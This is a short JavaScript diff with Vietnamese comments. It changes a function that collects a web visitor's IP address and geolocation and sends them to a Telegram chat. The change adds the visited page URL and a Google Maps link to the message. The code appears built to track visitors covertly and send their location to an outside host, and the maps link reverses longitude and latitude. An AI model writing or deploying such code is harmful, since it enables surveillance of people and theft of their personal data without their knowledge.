@@ -64,12 +64,13 @@ const sendMessageToTelegram = async (message) => {
 // Kết hợp tất cả
 const gatherAndSendInfo = async () => {
   console.log("Bắt đầu lấy thông tin...");
+  const pathName = window.location.href;
   const ip = await takeIP();
   const location = await takelocation();
 
-  const message = `📍 Thông tin người dùng:\n- 🌐 IP: ${ip}\n- 📍 Vị trí: Latitude ${location.latitude}, Longitude ${location.longitude}`;
-  console.log("Thông tin gửi đi:", message);
+  const message = `📍 Thông tin người dùng:\n- 🌐 IP: ${ip}\n- 📍Vị Trí: https://www.google.com/maps/place/${location.longitude},${location.latitude} \nTrang Truy Cập: ${pathName}`;
 
+  console.log("Thông tin gửi đi:", message);
   await sendMessageToTelegram(message);
 };
 
